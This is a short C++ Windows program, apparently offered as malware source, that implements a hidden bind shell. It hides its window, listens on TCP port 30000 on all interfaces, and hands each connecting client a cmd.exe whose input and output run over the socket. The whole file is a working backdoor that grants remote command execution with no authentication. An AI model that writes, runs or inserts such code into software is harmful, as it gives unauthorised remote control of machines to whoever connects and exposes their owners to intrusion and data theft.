#include <WinSock2.h>
#include <Windows.h>

SOCKET socket_handle;
STARTUPINFO startup_info;
PROCESS_INFORMATION process_info;
sockaddr_in sockaddr_info;
WCHAR cmd_name[] = L"cmd.exe";

int bind_port(int port) {
	socket_handle = WSASocket(AF_INET, SOCK_STREAM, 0, nullptr, 0, 0);
	sockaddr_info.sin_family = AF_INET;
	sockaddr_info.sin_port = htons(port);
	sockaddr_info.sin_addr.s_addr = htons(INADDR_ANY);
	if (SOCKET_ERROR == bind(socket_handle, (sockaddr*)&sockaddr_info, sizeof(sockaddr_info))) {
		return 1;
	}
	listen(socket_handle, 2);

	while (true) {
		SOCKET req = accept(socket_handle, nullptr, nullptr);
		if (req == INVALID_SOCKET) {
			return 2;
		}
		startup_info.hStdInput = (void*)req;
		startup_info.hStdError = (void*)req;
		startup_info.hStdOutput = (void*)req;
		CreateProcessW(nullptr, cmd_name, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &startup_info, &process_info);
	}
	return 0;
}

int WINAPI WinMain(HINSTANCE self, HINSTANCE prev, LPSTR argv, int argc) {
	WSADATA wsadata;
	if (WSAStartup(MAKEWORD(1, 1), &wsadata) != 0) {
		return 1;
	}
	memset(&sockaddr_info, 0, sizeof(sockaddr_info));
	memset(&startup_info, 0, sizeof(startup_info));
	startup_info.cb = sizeof(startup_info);
	startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	startup_info.wShowWindow = SW_HIDE;
	return bind_port(30000);
}